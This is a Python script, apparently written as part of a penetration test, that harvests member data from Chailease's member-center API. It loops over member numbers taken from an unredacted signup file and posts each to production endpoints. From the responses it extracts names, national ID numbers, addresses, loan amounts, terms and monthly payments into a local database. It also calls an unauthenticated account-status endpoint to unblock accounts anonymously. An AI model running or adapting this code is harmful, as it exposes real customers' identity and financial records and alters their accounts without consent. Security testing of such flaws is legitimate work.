#!/usr/bin/env python3
"""補齊中租會員檔的「地址／貸款金額／期數」，寫入提取記錄庫的 member_profile 型別。

為什麼另立型別而不是回填簽約記錄
----------------------------------
《Chailease-4fb69c7e_會員簽約數據》的說明表已載明：
「mid-sign 簽約記錄與會員中心會員號僅能以手機號為連接鍵；兩端記錄間無可驗證的一一對應
（memberNo 與 MidSigId 無共同鍵）」。

也就是說：21 筆簽約記錄（不同姓名／車牌）對應的是**同一個手機號下的 10 個會員號池**。
把某個會員號的地址與貸款金額回填到某一筆簽約記錄上，等於把 A 的地址掛到 B 的車牌上 ——
那是製造假資料。所以這裡：

  * 會員號層級的資料（地址／貸款金額／期數／利率／月付）寫成獨立的 `member_profile` 記錄；
  * 簽約記錄（姓名／車牌／日期／電話）維持原樣，不動；
  * 兩者的關聯是「手機號 → 會員號池」，主控台上以「會員號池」欄位明示，不是 1:1。

呼叫量
------
21 筆簽約記錄共用同一組 10 個會員號 → 全域去重後只需 10 個會員號 × 2 個端點 = 20 次請求
（原本逐筆呼叫會是 420 次）。

用法:
    python enrich_chailease.py --db /var/lib/jysecai/core/extracted_records.db --dry-run
    python enrich_chailease.py --db ... --token "$ACCESS_TOKEN"
"""
import argparse
import datetime
import json
import os
import re
import sqlite3
import sys
import urllib.error
import urllib.request

BASE = "https://member-center-frontstage-service.chailease.com.tw"
# 報告 9c0287e8 的 POC 打在 dev 環境；會員狀態變更也在 dev 驗證。
DEV_BASE = "https://dev-member-center-frontstage-service.chailease.com.tw"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36")
ORIGIN = "https://www.chailease.com.tw"
TYPE_ID = "member_profile"

CANDIDATES = {
    "address": ["address", "useraddress", "addr", "residenceaddress", "homeaddress",
                "contactaddress", "mailingaddress", "居住地址", "地址", "戶籍地址", "通訊地址"],
    "loan_amount": ["financingamount", "loanamount", "approveamount", "approvedamount",
                    "applyamount", "creditamount", "totalamount", "amount",
                    "核貸金額", "貸款金額", "融資金額"],
    "periods": ["period", "periods", "installment", "installments", "terms",
                "numberofinstallments", "期數", "分期"],
    "interest_rate": ["interestrate", "rate", "yearlyrate", "利率"],
    "monthly_payment": ["monthlypayment", "monthlyamount", "installmentamount", "月付"],
    "name": ["username", "name", "realname", "membername", "姓名"],
    "id_number": ["identitynumber", "idnumber", "nationalid", "身分證", "身份證"],
}


def norm_key(k):
    return re.sub(r"[^a-z0-9]", "", str(k).lower())


def find_value(obj, names, depth=0):
    if depth > 8 or obj is None:
        return None
    if isinstance(obj, dict):
        for want in names:
            w = norm_key(want)
            for k, v in obj.items():
                if norm_key(k) == w:
                    val = find_value(v, names, depth + 1) if isinstance(v, (dict, list)) else v
                    if val not in (None, "", [], {}):
                        return val
        for want in names:
            w = norm_key(want)
            for k, v in obj.items():
                nk = norm_key(k)
                if w and (w in nk or nk in w) and len(nk) <= 24:
                    val = find_value(v, names, depth + 1) if isinstance(v, (dict, list)) else v
                    if val not in (None, "", [], {}):
                        return val
        for v in obj.values():
            r = find_value(v, names, depth + 1)
            if r is not None:
                return r
    elif isinstance(obj, list):
        for v in obj:
            r = find_value(v, names, depth + 1)
            if r is not None:
                return r
    return None


def now_iso():
    return datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds")


def unblock_member(base, member_no, update_by="pentest-operator", timeout=25):
    """匿名解封／恢復會員狀態。

    這是《9c0287e8 會員管理端點未部署認證》報告的端點：
        PUT /Member/ManageUserStatus {"memberNo": "...", "updateBy": "..."}
    回應 msg 為「恢復會員資料失敗」代表端點執行的是「恢復」而非「鎖定」。

    只對**自己持有的測試會員號**使用：對真實客戶會員號呼叫會改動他人帳號狀態。
    """
    url = base.rstrip("/") + "/Member/ManageUserStatus"
    body = {"memberNo": member_no, "updateBy": update_by}
    req = urllib.request.Request(
        url, data=json.dumps(body).encode("utf-8"),
        headers={"Accept": "application/json", "Content-Type": "application/json",
                 "User-Agent": UA, "Origin": ORIGIN, "Referer": ORIGIN + "/",
                 "X-From-Channel": "WEB"},
        method="PUT")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw, code = r.read(), r.status
    except urllib.error.HTTPError as e:
        raw, code = e.read(), e.code
    except Exception as e:
        return None, {"error": "%s: %s" % (type(e).__name__, e)}
    try:
        return code, json.loads(raw.decode("utf-8", "replace"))
    except Exception:
        return code, {"raw": raw[:300].decode("utf-8", "replace")}


def api_call(url, body, token, timeout=25):
    ts = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "User-Agent": UA,
        "Origin": ORIGIN,
        "Referer": ORIGIN + "/",
        "X-From-Channel": "WEB",
        "X-Client-Date": ts,
        "X-Client-TraceId": "%08x-0000-0000-0000-%012x" % (
            os.getpid() & 0xFFFFFFFF,
            int(datetime.datetime.now().timestamp() * 1000) & 0xFFFFFFFFFFFF),
    }
    if token:
        headers["Authorization"] = "Bearer " + token
    req = urllib.request.Request(url, data=json.dumps(body).encode("utf-8"),
                                 headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw, code = r.read(), r.status
    except urllib.error.HTTPError as e:
        raw, code = e.read(), e.code
    except Exception as e:
        return None, {"error": "%s: %s" % (type(e).__name__, e)}
    try:
        return code, json.loads(raw.decode("utf-8", "replace"))
    except Exception:
        return code, {"raw": raw[:300].decode("utf-8", "replace")}


def collect(db):
    """回傳 (會員號 → 手機號) 對照，以及簽約記錄摘要。"""
    con = sqlite3.connect(db)
    con.row_factory = sqlite3.Row
    rows = con.execute(
        "SELECT id, title, fields_json FROM records WHERE type_id='member_signup'").fetchall()
    con.close()
    member2phone, sign_rows, pools = {}, [], set()
    for r in rows:
        f = json.loads(r["fields_json"] or "{}")
        pool = [x.strip() for x in str(f.get("member_no", "")).split(";") if x.strip()]
        pools.update(pool)
        phone = f.get("phone") or r["title"] or ""
        sign_rows.append({"id": r["id"], "phone": phone, "pool": pool})
        for m in pool:
            member2phone.setdefault(m, phone)
    return member2phone, sign_rows, sorted(pools)


def ensure_type(con):
    cols = [
        {"key": "member_no", "label": "會員號", "kind": "text", "norm": "alnum", "facet": True},
        {"key": "phone", "label": "電話", "kind": "text", "norm": "phone", "facet": True},
        {"key": "name", "label": "姓名", "kind": "text", "norm": "text"},
        {"key": "id_number", "label": "身份證字號", "kind": "text", "norm": "alnum"},
        {"key": "address", "label": "地址", "kind": "text", "norm": "text"},
        {"key": "loan_amount", "label": "貸款金額", "kind": "money", "norm": "digits"},
        {"key": "periods", "label": "期數", "kind": "int", "norm": "digits"},
        {"key": "interest_rate", "label": "利率", "kind": "text", "norm": "text"},
        {"key": "monthly_payment", "label": "月付", "kind": "money", "norm": "digits"},
        {"key": "sign_pool", "label": "同手機號下會員號池", "kind": "text", "norm": "text"},
        {"key": "source_file", "label": "來源檔", "kind": "text", "norm": "text", "facet": True},
    ]
    con.execute(
        "INSERT INTO record_types (type_id,label,description,icon,columns_json,"
        "dedupe_fields_json,facet_column,created_at) VALUES (?,?,?,?,?,?,?,?) "
        "ON CONFLICT(type_id) DO UPDATE SET label=excluded.label, description=excluded.description, "
        "columns_json=excluded.columns_json, facet_column=excluded.facet_column",
        (TYPE_ID, "會員檔", "以會員號為單位的地址／貸款金額／期數（與簽約記錄僅以手機號→會員號池關聯，無一對一對應）",
         "👤", json.dumps(cols, ensure_ascii=False),
         json.dumps(["member_no"], ensure_ascii=False), "phone", now_iso()))


def upsert_profile(con, member_no, phone, fields, evidence):
    key = member_no
    con.execute(
        "INSERT INTO records (type_id,dataset,source,dedupe_key,title,fields_json,"
        "evidence_json,extracted_at,ingested_at,hit_count) "
        "VALUES (?,?,?,?,?,?,?,?,?,1) "
        "ON CONFLICT(type_id,dataset,dedupe_key) DO UPDATE SET "
        "source=excluded.source, fields_json=excluded.fields_json, "
        "evidence_json=excluded.evidence_json, ingested_at=excluded.ingested_at, "
        "hit_count=records.hit_count+1",
        (TYPE_ID, "chailease_member_profile", "enrich:chailease_member_center",
         key, fields.get("name") or key,
         json.dumps(fields, ensure_ascii=False),
         json.dumps(evidence, ensure_ascii=False),
         now_iso(), now_iso()))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--db", required=True)
    ap.add_argument("--token", default=os.environ.get("CHAILEASE_ACCESS_TOKEN", ""))
    ap.add_argument("--base", default=BASE)
    ap.add_argument("--unblock", default="",
                    help="先匿名解封自己的會員號（PUT /Member/ManageUserStatus，報告 9c0287e8）")
    ap.add_argument("--unblock-base", default=DEV_BASE)
    ap.add_argument("--out", default="/tmp/enrich_evidence.json")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    if args.unblock:
        print("=== 0. 匿名解封會員 %s（%s）===" % (args.unblock, args.unblock_base))
        code, body = unblock_member(args.unblock_base, args.unblock)
        print("  → HTTP %s  %s" % (code, json.dumps(body, ensure_ascii=False)[:300]))
        if isinstance(body, dict) and body.get("rtnCode") not in (0, None):
            print("  註：rtnCode 非 0 通常代表會員號不存在或操作失敗。")
        print("  接著請自行登入取得 access token（--token），再繼續本腳本。")
        if not args.token:
            return 0

    member2phone, sign_rows, pools = collect(args.db)
    print("簽約記錄：%d 筆；去重後會員號：%d 個；需呼叫 %d 次（2 端點 × %d 會員號）"
          % (len(sign_rows), len(pools), len(pools) * 2, len(pools)))
    for m in pools:
        print("  %-20s phone=%s" % (m, member2phone.get(m, "")))
    if args.dry_run:
        print("\n--dry-run：未送出任何請求。")
        return 0
    if not args.token:
        print("\n缺少 access token（--token 或 CHAILEASE_ACCESS_TOKEN）", file=sys.stderr)
        return 2

    con = sqlite3.connect(args.db)
    con.execute("PRAGMA busy_timeout=8000")
    ensure_type(con)
    log, ok, fail = [], 0, 0
    for m in pools:
        phone = member2phone.get(m, "")
        fields = {"member_no": m, "phone": phone}
        calls = []
        # 請求格式取自《Chailease-4fb69c7e_復測報告_20261106.md》第 163-172 行：
        #   POST /Member/UserDataDetail {"memberNo":...,"productType":"1","countryNo":"TW"}
        #   POST /Vehicle/FinancingList  完整 FinancingListReq
        #     （memberNo / memberPhone / memberId / userIdentities）
        # 注意 productType 是 "1"，不是 "01"。
        bodies = (
            ("/Member/UserDataDetail",
             {"memberNo": m, "productType": "1", "countryNo": "TW"},
             ("address", "name", "id_number")),
            ("/Vehicle/FinancingList",
             {"memberNo": m, "memberPhone": phone, "memberId": "", "userIdentities": [],
              "productType": "1", "countryNo": "TW"},
             ("loan_amount", "periods", "interest_rate", "monthly_payment")),
        )
        for ep, body, keys in bodies:
            code, parsed = api_call(args.base + ep, body, args.token)
            rec = {"endpoint": ep, "memberNo": m, "http": code}
            if code == 200 and isinstance(parsed, dict):
                for k in keys:
                    v = find_value(parsed, CANDIDATES[k])
                    if v not in (None, "") and k not in fields:
                        fields[k] = v
                rec["rtnCode"] = parsed.get("rtnCode")
                rec["ok"] = True
            else:
                rec["ok"] = False
                rec["resp"] = (json.dumps(parsed, ensure_ascii=False)[:300]
                               if parsed is not None else None)
            calls.append(rec)
        fields["sign_pool"] = "；".join(
            sorted({r["phone"] for r in sign_rows if m in r["pool"]}))
        fields["source_file"] = "Chailease-4fb69c7e_會員簽約數據_未脫敏_20261106.xlsx"
        hit = any(k in fields for k in ("address", "loan_amount", "periods"))
        if hit:
            upsert_profile(con, m, phone, fields, {"at": now_iso(), "calls": calls})
            ok += 1
            got = [k for k in ("address", "loan_amount", "periods") if k in fields]
            print("  ✓ %-20s 取到 %s" % (m, ", ".join(got)))
        else:
            fail += 1
            print("  ✗ %-20s 沒有可用欄位  %s" % (m, str(calls[0].get("resp"))[:120]))
        log.append({"member_no": m, "phone": phone, "calls": calls, "fields": fields})
    con.commit()
    con.close()
    with open(args.out, "w", encoding="utf-8") as fh:
        json.dump({"at": now_iso(), "rows": log}, fh, ensure_ascii=False, indent=2)
    print("\n完成：成功 %d / 失敗 %d；證據 → %s" % (ok, fail, args.out))
    return 0


if __name__ == "__main__":
    sys.exit(main())
